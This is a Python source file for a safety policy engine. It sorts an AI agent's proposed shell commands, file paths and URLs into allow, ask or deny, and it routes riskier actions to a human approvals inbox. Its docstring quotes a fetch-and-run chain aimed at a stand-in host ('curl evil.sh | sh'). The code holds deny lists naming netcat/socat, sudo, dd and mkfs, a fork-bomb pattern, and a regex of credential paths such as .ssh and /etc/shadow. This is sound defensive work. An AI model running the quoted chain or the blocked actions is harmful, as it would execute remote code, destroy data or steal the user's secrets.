"""Safety policy engine: classifies actions as allow / ask / deny.

Design driven by documented incidents of other agent products (see
docs/research/complaints.md):

- Compound commands are split on unquoted ``&&``, ``||``, ``;``, ``|`` BEFORE
  matching rules, because allowlist bypass via chaining
  (``git status && curl evil.sh | sh``) was a year-old unfixed bug elsewhere.
- Escalation (sudo), secret reads (~/.ssh, .env), pipe-to-interpreter and
  outbound exfil channels (``| curl``) are hard-denied — bots never need them.
- Workspace-relative destructive ops (``rm -rf build/``) are "ask", with a
  sticky per-bot allow so supervision stays bearable instead of being disabled.
"""

from __future__ import annotations

import fnmatch
import os
import re
import shlex
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
from typing import Optional, Sequence

from .shellparse import SUBST, ParseError, Segment, split_compound  # noqa: F401  (re-exported)


class Verdict(str, Enum):
    allow = "allow"
    ask = "ask"
    deny = "deny"


_SEVERITY = {Verdict.allow: 0, Verdict.ask: 1, Verdict.deny: 2}


@dataclass
class Decision:
    verdict: Verdict
    reason: str
    sticky_key: str = ""  # non-empty when a "always allow" could apply
    rule: str = ""        # id of the rule that fired, shown in the approvals inbox (UI-5)
    risk: str = ""        # low | medium | high
    outward: bool = False  # sends something out of the machine: always asks, never sticky (SR-4)
    segments: list = field(default_factory=list)  # per-segment breakdown of a compound command

    def worse(self, other: "Decision") -> "Decision":
        merged_outward = self.outward or other.outward
        generic = ("", "allow:default", "allow:empty")
        pick = other if (_SEVERITY[other.verdict] > _SEVERITY[self.verdict]
                         or (other.verdict is self.verdict and self.rule in generic and other.rule not in generic)) else self
        if merged_outward and not pick.outward:
            pick = Decision(pick.verdict, pick.reason, pick.sticky_key, pick.rule, pick.risk,
                            True, pick.segments)
        return pick


# --------------------------------------------------------------------------
# Rule tables
# --------------------------------------------------------------------------

_DENY_PROGRAMS = {
    "sudo", "su", "doas", "pkexec", "visudo",
    "nc", "ncat", "netcat", "socat", "telnet",
    "mkfs", "mkfs.ext4", "mkfs.btrfs", "mkfs.xfs", "fdisk", "sfdisk", "parted", "wipefs",
    "dd", "shred",
    "shutdown", "reboot", "halt", "poweroff", "telinit",
    "crontab", "chpasswd", "passwd",
}

_ASK_PROGRAMS = {
    "rm", "mv", "chmod", "chown", "chattr", "truncate",
    "kill", "pkill", "killall",
    "apt", "apt-get", "pacman", "yum", "dnf", "apk", "brew",
    "pip", "pip3", "npm", "yarn", "pnpm", "cargo", "go",
    "docker", "podman", "systemctl", "ftp", "ssh", "scp", "rsync",
}

_INTERPRETERS = {
    "sh", "bash", "dash", "zsh", "ksh", "fish", "python", "python3",
    "perl", "ruby", "node", "eval", "exec",
}

_SHELLS = {"sh", "bash", "dash", "zsh", "ksh", "fish"}

#: programs that run another program: name -> options that take a value
_WRAPPERS = {
    "env": {"-u", "-C", "-S", "--unset", "--chdir"}, "nohup": set(),
    "nice": {"-n", "--adjustment"}, "ionice": {"-c", "-n", "-p", "--class", "--classdata", "--pid"},
    "timeout": {"-s", "-k", "--signal", "--kill-after"},
    "time": {"-f", "-o", "--format", "--output"},
    "stdbuf": {"-i", "-o", "-e", "--input", "--output", "--error"},
    "setsid": set(), "command": set(), "builtin": set(),
    "exec": {"-a"},
    "xargs": {"-n", "-I", "-L", "-P", "-d", "-E", "-s", "-a", "-J", "--arg-file",
              "--delimiter", "--eof", "--max-args", "--max-lines", "--max-chars", "--max-procs",
              "--process-slot-var", "--replace"},
    "watch": {"-n", "-d", "--interval", "--differences"},
    "taskset": {"-c", "--cpu-list"}, "chrt": {"-p", "--pid"},
}
#: wrappers whose first positional argument is not the program (a duration, a CPU mask, a priority)
_POSITIONAL_FIRST = {"timeout", "taskset", "chrt"}

MAX_DEPTH = 6


def _unwrap(name: str, args: list[str]) -> list[str]:
    """The command a wrapper runs: its tokens after the wrapper's own options."""
    valued = _WRAPPERS[name]
    skip_positional = name in _POSITIONAL_FIRST
    i = 0
    while i < len(args):
        t = args[i]
        if t == "--":
            i += 1
            break
        if name == "env" and t in ("-S", "--split-string"):
            if i + 1 >= len(args):
                return ["$UNPARSEABLE_ENV_SPLIT"]
            try:
                split = shlex.split(args[i + 1])
            except ValueError:
                return ["$UNPARSEABLE_ENV_SPLIT"]
            return split + args[i + 2:]
        if name == "env" and t.startswith("-S") and len(t) > 2:
            try:
                split = shlex.split(t[2:])
            except ValueError:
                return ["$UNPARSEABLE_ENV_SPLIT"]
            return split + args[i + 1:]
        if name == "env" and t.startswith("--split-string="):
            try:
                split = shlex.split(t.partition("=")[2])
            except ValueError:
                return ["$UNPARSEABLE_ENV_SPLIT"]
            return split + args[i + 1:]
        if t.startswith("--") and "=" in t:
            option = t.partition("=")[0]
            if option in valued:
                if name == "taskset":
                    skip_positional = False
                i += 1
                continue
        if name == "taskset" and t.startswith("-c") and len(t) > 2:
            skip_positional = False
            i += 1
            continue
        if t.startswith("-") and len(t) > 1:
            if name == "taskset" and t in valued:
                skip_positional = False
            i += 2 if t in valued else 1
            continue
        if name == "env" and "=" in t:
            i += 1
            continue
        if skip_positional:
            skip_positional = False
            i += 1
            continue
        break
    return args[i:]


def _find_payloads(toks: list[str]) -> list[list[str]]:
    """The commands after find's -exec / -execdir / -ok / -okdir, up to the closing ``;`` or ``+``."""
    out: list[list[str]] = []
    i = 0
    while i < len(toks):
        if toks[i] in ("-exec", "-execdir", "-ok", "-okdir"):
            j = i + 1
            while j < len(toks) and toks[j] not in (";", "+", "\\;"):
                j += 1
            if toks[i + 1:j]:
                out.append(toks[i + 1:j])
            i = j
        i += 1
    return out


_SAFE_REDIRECT_TARGETS = {"/dev/null", "/dev/stdout", "/dev/stderr"}


def _bad_redirect(target: str) -> str:
    """Why a redirect target escapes the workspace (empty when it is fine)."""
    t = target.strip()
    if t in _SAFE_REDIRECT_TARGETS or not t:
        return ""
    if SUBST in t or t.startswith(("/", "~")) or "$" in t or "`" in t:
        return t
    if ".." in t.split("/"):
        return t
    return ""


_EGRESS_PROGRAMS = {"curl", "wget", "nc", "ncat", "ssh", "scp", "rsync", "ftp", "telnet"}

#: asking-class programs that send data off this machine: they always ask, even with a sticky allow (SR-4)
_OUTWARD_PROGRAMS = {"ssh", "scp", "rsync", "ftp"}

_SECRET_RE = re.compile(
    r"(\.ssh|id_rsa|id_ed25519|\.gnupg|\.aws|\.kube|\.docker/config\.json|"
    r"\.netrc|\.env\b|\.env\.|/etc/shadow|/etc/sudoers|credentials\.json|"
    r"\.git-credentials|\.npmrc|\.pypirc)",
    re.IGNORECASE,
)

_FORK_BOMB_RE = re.compile(r":\(\)\s*\{.*\};\s*:")

# rm targets that would escape the workspace
_UNSAFE_TARGET_RE = re.compile(r"^(\/|~|\$HOME|\.\.?$|\.\./)")

# curl/wget flags that turn a read into a write/exfil
_UPLOAD_FLAG_RE = re.compile(r"^(-X|--request)$")
_UPLOAD_METHODS = {"post", "put", "patch", "delete"}
_UPLOAD_FLAGS = {"-d", "--data", "--data-raw", "--data-binary", "--data-urlencode",
                 "-F", "--form", "-T", "--upload-file", "--form-string"}


def _program(tokens: list[str]) -> str:
    if not tokens:
        return ""
    name = tokens[0]
    if name.startswith("/"):
        name = name.rsplit("/", 1)[-1]
    # env VAR=val cmd
    if "=" in name and len(tokens) > 1:
        return tokens[1].rsplit("/", 1)[-1]
    return name


#: programs that only ever read (rehearsal runs these for real; everything else is simulated)
_READONLY_PROGRAMS = {
    "ls", "cat", "head", "tail", "wc", "grep", "egrep", "fgrep", "rg", "pwd", "echo", "printf", "date", "stat", "du", "df",
    "file", "uniq", "cut", "tr", "diff", "cmp", "which", "type", "tree", "basename", "dirname", "realpath", "readlink",
    "sha256sum", "sha1sum", "md5sum", "jq", "true", "false", "test", "[", "[[", "seq", "expr", "id", "whoami", "uname",
    "hostname", "uptime", "nproc", "sort", "find", "git", "cd",
}
_READONLY_GIT = {"status", "log", "diff", "show", "ls-files", "rev-parse", "describe", "shortlog", "blame", "grep"}
_FIND_MUTATORS = {"-exec", "-execdir", "-ok", "-okdir", "-delete", "-fprint", "-fprint0", "-fprintf", "-fls"}


def is_read_only(command: str, _depth: int = 0) -> bool:
    """True only if EVERY part of the command is known to change nothing: a pipeline of read-only programs, no writing
    redirect, no background job, and any nested command also read-only. When unsure the answer is False (rehearsal then
    simulates the command instead of running it)."""
    if _depth > MAX_DEPTH or not command.strip():
        return False
    try:
        segments = split_compound(command)
    except ParseError:
        return False
    if not segments:
        return False
    for seg in segments:
        if seg.background or any(t not in _SAFE_REDIRECT_TARGETS for t in seg.redirects) or seg.heredoc:
            return False
        if seg.subshell:
            pass
        else:
            toks = seg.tokens
            prog = os.path.basename(toks[0]) if toks else ""
            if prog not in _READONLY_PROGRAMS or any(SUBST in t for t in toks[:1]):
                return False
            if prog == "find" and any(t in _FIND_MUTATORS for t in toks):
                return False
            if prog == "sort" and any(t in ("-o", "--output") or t.startswith("--output=") or (t.startswith("-") and not t.startswith("--") and "o" in t[1:]) for t in toks[1:]):
                return False
            if prog == "git":
                sub = next((t for t in toks[1:] if not t.startswith("-")), "")
                if sub not in _READONLY_GIT or any(t in ("--output", "-o") or t.startswith("--output=") for t in toks):
                    return False
        if not all(is_read_only(inner, _depth + 1) for inner in seg.nested):
            return False
    return True


RULE_VERDICTS = ("allow", "ask", "deny")
MAX_RULES = 50
MAX_RULE_LEN = 200


def parse_rules(text: str) -> list[tuple[str, str]]:
    """``verdict: glob`` per line (blank lines and ``#`` comments ignored) -> [(verdict, glob)].

    Raises ValueError naming the line, so a typo in a safety setting is rejected instead of silently doing nothing.
    """
    out: list[tuple[str, str]] = []
    for n, raw in enumerate((text or "").splitlines(), start=1):
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        verdict, sep, glob = line.partition(":")
        verdict, glob = verdict.strip().lower(), glob.strip()
        if not sep or verdict not in RULE_VERDICTS:
            raise ValueError(f"line {n}: write it as 'allow: <pattern>', 'ask: <pattern>' or 'deny: <pattern>' "
                             f"(got {raw.strip()!r})")
        if not glob:
            raise ValueError(f"line {n}: the pattern after '{verdict}:' is empty")
        if len(glob) > MAX_RULE_LEN:
            raise ValueError(f"line {n}: a pattern is limited to {MAX_RULE_LEN} characters")
        out.append((verdict, glob))
    if len(out) > MAX_RULES:
        raise ValueError(f"at most {MAX_RULES} rules (you wrote {len(out)})")
    return out


def rules_text(rules: Sequence) -> str:
    return "\n".join(f"{r.verdict}: {r.match}" for r in rules)


class PolicyEngine:
    """Pure (store-free) classification of proposed actions.

    ``tier`` and ``rules`` are the bot's own refinements (SR-12). The order is fixed and the limits are structural:

    1. the built-in classification runs first;
    2. a HARD DENY (secrets, exfiltration, privilege escalation, workspace escape) is final: no rule and no tier can
       turn it into allow or ask;
    3. the first of the bot's rules whose glob matches the command segment may tighten (allow->ask/deny, ask->deny)
       or loosen (ask->allow) the decision, but never loosen an outward-sending action (SR-4: those always ask);
    4. the tier handles what is still "ask": ``readonly`` blocks it, ``supervised`` keeps asking, ``trusted`` lets
       non-outward asks run.
    """

    def __init__(self, tier: object = "supervised", rules: Sequence = ()):
        self.tier = getattr(tier, "value", tier) or "supervised"
        self.rules = [(getattr(r, "verdict", None) or r[0], getattr(r, "match", None) or r[1]) for r in rules]

    def _apply_rule(self, text: str, d: "Decision") -> "Decision":
        text = text.strip()
        hit = next(((v, g) for v, g in self.rules if fnmatch.fnmatchcase(text, g)), None)
        if hit is None or d.verdict is Verdict.deny:
            return d
        verdict, glob = hit
        if verdict == "deny":
            return Decision(Verdict.deny, f"blocked by your rule '{glob}'", rule=f"rule:deny:{glob}",
                            risk=d.risk or "medium", outward=d.outward, segments=d.segments)
        if verdict == "ask":
            if d.verdict is Verdict.ask:
                return d
            return Decision(Verdict.ask, f"your rule '{glob}' requires approval", f"rule:{glob}",
                            rule=f"rule:ask:{glob}", risk=d.risk or "medium", outward=d.outward, segments=d.segments)
        if d.verdict is Verdict.ask and not d.outward:
            return Decision(Verdict.allow, f"allowed by your rule '{glob}'", rule=f"rule:allow:{glob}",
                            risk=d.risk, segments=d.segments)
        return d

    def _tier(self, d: "Decision") -> "Decision":
        if d.verdict is not Verdict.ask:
            return d
        if self.tier == "readonly":
            return Decision(Verdict.deny, f"this bot is read-only, so it may not do this ({d.reason})",
                            rule="deny:tier-readonly", risk=d.risk or "medium", outward=d.outward, segments=d.segments)
        if self.tier == "trusted" and not d.outward:
            return Decision(Verdict.allow, f"allowed: this bot is trusted ({d.reason})", rule="allow:tier-trusted",
                            risk=d.risk, segments=d.segments)
        return d

    def check_computer(self, action: str, application: str = "") -> Decision:
        """Native input is consequential even without network: it can modify granted workspace files."""
        if self.tier == "readonly":
            return Decision(Verdict.deny, "this bot is read-only; native input and application launch are refused",
                            rule="deny:tier-readonly", risk="medium")
        text = f"computer {action}" + (f" {application}" if application else "")
        decision = Decision(Verdict.ask, text, rule="ask:computer-action", risk="medium")
        return self._tier(self._apply_rule(text, decision))

    # ------------------------------------------------------------ shell

    def check_shell(self, command: str, _depth: int = 0) -> Decision:
        if not command.strip():
            return Decision(Verdict.allow, "empty command")
        if _depth > MAX_DEPTH:
            return Decision(Verdict.deny, f"commands nested more than {MAX_DEPTH} levels deep cannot be checked",
                            rule="deny:too-deep", risk="high")
        if _FORK_BOMB_RE.search(command):
            return Decision(Verdict.deny, "fork bomb pattern")
        try:
            segments = split_compound(command)
        except ParseError as exc:
            return Decision(Verdict.deny, f"could not check this command safely: {exc}", rule="deny:unparseable",
                            risk="high")
        overall = Decision(Verdict.allow, "ok", rule="allow:default", risk="low")
        if not segments:
            return Decision(Verdict.allow, "empty command", rule="allow:empty", risk="low")
        breakdown = []
        for seg in segments:
            # the segment's OWN decision gets the bot's rules and tier; commands nested inside it were already judged
            # (with the same rules and tier) by the recursive call, so a rule on the outer text cannot launder them
            d = self._tier(self._apply_rule(seg.text, self._classify_segment(seg, _depth)))
            for inner in seg.nested:
                d = d.worse(self.check_shell(inner, _depth + 1))
            breakdown.append({"text": seg.text, "program": _program(seg.tokens), "verdict": d.verdict.value,
                              "reason": d.reason, "rule": d.rule})
            overall = overall.worse(d)
        if overall.verdict is Verdict.allow:
            overall.reason = "allowed by policy"
        overall.segments = breakdown
        return overall

    # ------------------------------------------------- wrappers, redirects, computed programs (SR-13)

    def _classify_segment(self, seg: Segment, depth: int = 0) -> Decision:
        base = self._classify_base(seg)
        if base.verdict is Verdict.deny:
            return base
        hidden = self._look_inside(seg, depth)
        return base.worse(hidden) if hidden is not None else base

    def _look_inside(self, seg: Segment, depth: int) -> Optional[Decision]:
        """Judge what a wrapper or interpreter would actually run: ``bash -c '...'``, ``eval``, ``env``/``nohup``/
        ``timeout``/``xargs``..., ``find -exec`` and interpreters fed by a network fetch."""
        toks = list(seg.tokens)
        while toks and "=" in toks[0] and not toks[0].startswith(("=", "-")):
            toks.pop(0)                                              # VAR=value prefixes
        if not toks:
            return None
        name = os.path.basename(toks[0])
        out: Optional[Decision] = None

        def add(d: Optional[Decision]) -> None:
            nonlocal out
            if d is not None:
                out = d if out is None else out.worse(d)

        if name in _SHELLS:
            script = self._dash_c_script(toks)
            if script is not None:
                add(self.check_shell(script, depth + 1))
        elif name == "eval" and len(toks) > 1:
            add(self.check_shell(" ".join(toks[1:]), depth + 1))
        elif name in _WRAPPERS:
            rest = _unwrap(name, toks[1:])
            if rest:
                # A command wrapper retains the shell segment's pipeline endpoints. Dropping
                # them lets `curl ... | env bash` evade the pipe-to-interpreter hard deny.
                inner = Segment(text=" ".join(rest), tokens=rest,
                                piped_in=seg.piped_in, piped_out=seg.piped_out)
                add(self._tier(self._apply_rule(inner.text, self._classify_segment(inner, depth + 1))))
        elif name == "find":
            for payload in _find_payloads(toks):
                inner = Segment(text=" ".join(payload), tokens=payload)
                add(self._tier(self._apply_rule(inner.text, self._classify_segment(inner, depth + 1))))
            if "-delete" in toks:
                add(Decision(Verdict.ask, "find -delete removes files", "shell:find-delete", rule="ask:find-delete",
                             risk="medium"))
        if name in _SHELLS | _INTERPRETERS | {".", "source"} and seg.nested:
            for inner in seg.nested:
                if self._fetches_network(inner, depth + 1):
                    add(Decision(Verdict.deny, "runs content fetched from the network", rule="deny:run-downloaded",
                                 risk="high", outward=True))
        return out

    @staticmethod
    def _dash_c_script(toks: list[str]) -> Optional[str]:
        for i, t in enumerate(toks[1:], start=1):
            if t == "--":
                return None
            if re.fullmatch(r"-[A-Za-z]+", t) and "c" in t[1:] and i + 1 < len(toks):
                return toks[i + 1]
            if not t.startswith("-"):
                return None                                          # `bash script.sh`: its contents are not analysed
        return None

    def _fetches_network(self, command: str, depth: int) -> bool:
        if depth > MAX_DEPTH:
            return True
        try:
            segs = split_compound(command)
        except ParseError:
            return True
        for seg in segs:
            if _program(seg.tokens) in _EGRESS_PROGRAMS or any(self._fetches_network(n, depth + 1) for n in seg.nested):
                return True
        return False

    def _classify_base(self, seg: Segment) -> Decision:
        for target in seg.redirects:
            bad = _bad_redirect(target)
            if bad:
                return Decision(Verdict.deny, f"redirects output outside the workspace ({bad})",
                                rule="deny:redirect-outside-workspace", risk="high")
        prog0 = _program(seg.tokens)
        if seg.subshell:
            pass                                                      # ( ... ): judged through its nested commands
        elif prog0 and prog0 not in ("[", "[[") and (SUBST in prog0 or prog0.startswith("~") or any(c in prog0 for c in "$`*?[{}")):
            return Decision(Verdict.deny, "the program name is computed at run time (expansion), so it cannot be checked",
                            rule="deny:computed-program", risk="high")
        return self._classify_segment_old(seg)

    def _classify_segment_old(self, seg: Segment) -> Decision:
        prog = _program(seg.tokens)
        text = seg.text

        if _SECRET_RE.search(text):
            return Decision(Verdict.deny, "references secrets/credentials paths", rule="deny:secret-path", risk="high")
        if seg.piped_in and (prog in _INTERPRETERS or prog in (".", "source")):
            return Decision(Verdict.deny, "piping untrusted data into an interpreter", rule="deny:pipe-to-interpreter", risk="high")
        if seg.piped_out and prog in _EGRESS_PROGRAMS and not self._looks_readonly(prog, seg.tokens):
            return Decision(Verdict.deny, "pipes command output to the network (exfiltration channel)", rule="deny:exfil-pipe", risk="high", outward=True)

        if prog in _DENY_PROGRAMS:
            return Decision(Verdict.deny, f"'{prog}' is on the hard denylist", rule=f"deny:program:{prog}", risk="high")

        if prog == "rm":
            targets = [t for t in seg.tokens[1:] if not t.startswith("-")]
            for t in targets:
                if _UNSAFE_TARGET_RE.match(t):
                    return Decision(Verdict.deny, f"rm targets outside the workspace: {t}", rule="deny:rm-outside-workspace", risk="high")
            return Decision(Verdict.ask, "deletes files", "shell:rm", rule="ask:rm", risk="medium")

        if prog in ("curl", "wget"):
            if not self._looks_readonly(prog, seg.tokens):
                return Decision(Verdict.deny, "network upload/write flags on " + prog, rule="deny:network-upload", risk="high", outward=True)
            return Decision(Verdict.allow, "read-only fetch", rule="allow:readonly-fetch", risk="low")

        if prog == "git":
            sub = seg.tokens[1] if len(seg.tokens) > 1 else ""
            if sub in ("push", "reset", "clean", "checkout", "rebase", "filter-branch"):
                return Decision(Verdict.ask, f"git {sub} mutates repo state", "shell:git", rule=f"ask:git-{sub}", risk="medium",
                            outward=(sub == "push"))
            return Decision(Verdict.allow, "read-only git", rule="allow:readonly-git", risk="low")

        if prog in _ASK_PROGRAMS:
            return Decision(Verdict.ask, f"'{prog}' can mutate the system", f"shell:{prog}", rule=f"ask:program:{prog}",
                            risk="medium", outward=prog in _OUTWARD_PROGRAMS)

        return Decision(Verdict.allow, "allowed by policy", rule="allow:default", risk="low")

    @staticmethod
    def _looks_readonly(prog: str, tokens: list[str]) -> bool:
        """curl/wget: only plain GET-style flags qualify as read-only."""
        for i, t in enumerate(tokens[1:], start=1):
            low = t.lower()
            flag = low.split("=", 1)[0]
            if flag in _UPLOAD_FLAGS or low in _UPLOAD_FLAGS:
                return False
            if flag in ("-x", "--request") and "=" not in low and i + 1 < len(tokens):
                if tokens[i + 1].lower().lstrip("-") in _UPLOAD_METHODS:
                    return False
            if flag in ("-t", "--upload-file", "--post-data", "--post-file"):
                return False
        return True

    # ------------------------------------------------------------- paths

    def check_path(self, path: str | Path, workspace: Path, write: bool) -> Decision:
        return self._tier(self._check_path(path, workspace, write))

    def _check_path(self, path: str | Path, workspace: Path, write: bool) -> Decision:
        """Workspace jail: every file operation must resolve inside the workspace."""
        ws = workspace.resolve()
        try:
            p = (ws / path if not Path(path).is_absolute() else Path(path)).resolve()
        except (OSError, RuntimeError) as exc:
            return Decision(Verdict.deny, f"unresolvable path: {exc}", rule="deny:unresolvable-path", risk="high")
        if ws != p and ws not in p.parents:
            return Decision(Verdict.deny, f"path escapes the workspace jail: {path}", rule="deny:path-jail", risk="high")
        if _SECRET_RE.search(str(p)):
            return Decision(Verdict.deny, "path references secrets", rule="deny:secret-path", risk="high")
        if write:
            return Decision(Verdict.ask, "writes a file", "files:write", rule="ask:file-write", risk="medium")
        return Decision(Verdict.allow, "read inside workspace", rule="allow:workspace-read", risk="low")

    # --------------------------------------------------------------- urls

    def check_url(self, url: str) -> Decision:
        """Syntax-level screen (no network): scheme, credentials, internal names, and every IP-literal spelling. The fetching
        code additionally resolves the name and re-checks every redirect (``hutch.netguard.safe_get``)."""
        from .netguard import screen_url
        reason = screen_url(url)
        if reason:
            rule = "deny:url-scheme" if reason.startswith("scheme") else "deny:private-address"
            return Decision(Verdict.deny, reason, rule=rule, risk="high")
        return Decision(Verdict.allow, "public http(s) fetch", rule="allow:public-fetch", risk="low")
